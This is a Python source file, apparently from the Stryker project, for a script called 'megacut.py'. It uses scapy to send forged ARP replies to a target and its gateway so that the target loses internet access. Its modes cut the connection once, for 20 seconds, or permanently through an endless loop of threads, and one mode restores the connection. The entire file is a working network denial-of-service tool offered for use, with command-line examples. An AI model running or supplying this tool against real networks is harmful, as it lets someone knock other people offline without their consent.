
#  __  __ ______ _____          _____ _    _ _______ 
# |  \/  |  ____/ ____|   /\   / ____| |  | |__   __|
# | \  / | |__ | |  __   /  \ | |    | |  | |  | |   
# | |\/| |  __|| | |_ | / /\ \| |    | |  | |  | |   
# | |  | | |___| |__| |/ ____ \ |____| |__| |  | |   
# |_|  |_|______\_____/_/    \_\_____|\____/   |_|   
#
# Special tool for Stryker by @zalexdev (ver 1.0)

import sys
import scapy.all as scapy
import time
import threading

#ARP table destroy
def killinet(t, gw):
    killer = scapy.ARP(hwdst = scapy.getmacbyip(t), psrc = gw,op = 2,pdst = t)
    scapy.send(killer, verbose = False)
    killer = scapy.ARP(op = 2, pdst = gw, hwdst = scapy.getmacbyip(gw), psrc = t)
    scapy.send(killer, verbose = False)

#ARP table restore
def inetback(ip1, ip2):
    mac1 = scapy.getmacbyip(ip1)
    mac2 = scapy.getmacbyip(ip2)
    restorer = scapy.ARP(op = 2, pdst = ip1, hwdst = mac1, psrc = ip2, hwsrc = mac2)
    scapy.send(restorer, verbose = False)
    restorer = scapy.ARP(op = 2, pdst = ip2, hwdst = mac2, psrc = ip1, hwsrc = mac1)
    scapy.send(restorer, verbose = False)
def printhelp():
    print(" __  __ ______ _____          _____ _    _ _______ \n|  \/  |  ____/ ____|   /\   / ____| |  | |__   __|\n| \  / | |__ | |  __   /  \ | |    | |  | |  | |   \n| |\/| |  __|| | |_ | / /\ \| |    | |  | |  | |   \n| |  | | |___| |__| |/ ____ \ |____| |__| |  | |   \n|_|  |_|______\_____/_/    \_\_____|\____/   |_|\n\nver 1.0 by @zalexdev. Special for stryker-project\n")
    print("\nTG: https://t.me/strykerapp || Stryker: https://github.com/stryker-project/app")
    print("\n\n\nmegacut.py <target ip\list of ip (,)> <gateway> <-m\-k\-b\-r>\n\n   -k Kill inet on target ip\n   -m Permanently disable inet on target (only if -k not works)\n   -b Disable inet for 20 seconds\n   -r Restore inet on target ip\n\n\nExamples:\n\npython3 megacut.py 192.168.1.101 192.168.1.1 -k\n\n")

#CHECK OPTION
try:
    if len(sys.argv) <3 or sys.argv[1] == "-h" or sys.argv[1] == "--help":
        printhelp()
    else:
        targets = sys.argv[1].split(",")
        gateway = sys.argv[2]
        for target in targets:
            if sys.argv[3] == "-m":
                while True:
                    threading.Thread(target=killinet, args=[target,gateway]).start()
            elif sys.argv[3] == "-r":
                threading.Thread(target=inetback, args=[target,gateway]).start()
            elif sys.argv[3] == "-k":
                threading.Thread(target=killinet, args=[target,gateway]).start()
            elif sys.argv[3] == "-b":
                threading.Thread(target=killinet, args=[target,gateway]).start()
                time.sleep(20)
                threading.Thread(target=inetback, args=[target,gateway]).start()
            else:
                printhelp()

except IndexError:
    printhelp()
